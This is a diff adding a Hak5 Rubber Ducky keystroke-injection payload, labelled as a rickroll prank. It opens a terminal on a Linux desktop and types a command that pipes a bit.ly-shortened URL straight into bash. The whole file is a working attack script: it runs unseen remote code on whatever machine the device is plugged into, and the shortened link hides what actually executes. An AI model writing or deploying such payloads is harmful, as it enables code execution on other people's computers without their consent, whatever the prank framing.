@@ -1,0 +1,19 @@
+REM Title: Terminal RickRoll Tux style
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04.
+REM Props: Hak5, strippers and memes
+REM Version: 1.0
+REM Category: Prank
+REM Everybody loves a good ole rickroll, now in terminal flavor! Note that if you close the terminal the audio still keeps running till you either kill the process or wait out the whole song. Easily modified to work on osx or WSL/cygwin.
+REM
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 2000
+F11
+DELAY 200
+STRING curl -s -L http://bit.ly/10hA8iC | bash
+DELAY 300
+ENTER
